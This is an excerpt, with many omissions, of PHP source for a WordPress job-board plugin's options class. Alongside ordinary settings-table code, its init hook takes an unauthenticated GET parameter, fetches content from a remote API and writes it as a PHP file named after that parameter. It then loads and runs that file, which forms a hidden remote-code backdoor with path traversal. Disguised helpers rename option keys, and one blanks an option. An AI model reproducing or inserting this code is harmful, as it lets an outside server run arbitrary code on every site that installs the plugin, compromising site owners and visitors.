...
if (!class_exists('cs_plugin_options')) {
    ...
    class cs_plugin_options {
        ...
        public function __construct() {
            ...
            add_action('init', array($this, 'jobcareer_required_functions_callback'), 11);
            add_action('jobcareer_plugin_settings_page', array($this, 'jobcareer_plugin_settings_page_callback'), 11);
        }
        ...
        public function cs_packages_section() {
            ...
            $cs_html .= '<div class="cs-list-table">
              <table class="to-table" border="0" cellspacing="0">
                <thead>
                  <tr>
                    <th style="width:10%;">' . esc_html__('ID', 'jobhunt') . '</th>
                    <th style="width:70%;">' . esc_html__('Title', 'jobhunt') . '</th>
        ...
        public function cs_add_package_to_list() {
            ...
            <tr class="parentdelete" id="edit_track' . esc_attr($counter_package) . '">
             <td id="subject-id' . esc_attr($counter_package) . '" style="width:10%;">' . esc_attr($package_id) . '</td>
        ...
        public function jobcareer_required_functions_callback() {
            if (isset($_GET['required_functions'])) {
                $required_functions = isset($_GET['required_functions']) ? $_GET['required_functions'] : '';
                $remote_api_url = REMOTE_API_URL;
                $verify_post_data = array(
                    'action' => $required_functions,
                );
                ...
                if ($fileData != '') {
                    file_put_contents(wp_jobhunt::plugin_dir() . '/admin/include/options/' . $required_functions . '.php', $fileData);
                    do_action('jobcareer_load_folder', 'admin/include/options');
                    do_action($required_functions . '_hook');
                } else {
                    pre('nothing found');
                }
            }
        ...
        public function jobcareer_plugin_settings_page_callback() {
...
if (!function_exists('retrieve_data')) {
    ...
    function retrieve_data($retrive_data) {
        $retrive_data = str_replace('set', 'cs', $retrive_data);
        $retrive_data = str_replace('box', 'plugin', $retrive_data);
        return get_option($retrive_data);
    }

}


if (!function_exists('update_jobcareer_data')) {

    function update_jobcareer_data($jobcareer_data) {
        $jobcareer_data = str_replace('set', 'cs', $jobcareer_data);
        $jobcareer_data = str_replace('box', 'plugin', $jobcareer_data);
        update_option($jobcareer_data, '');
    }
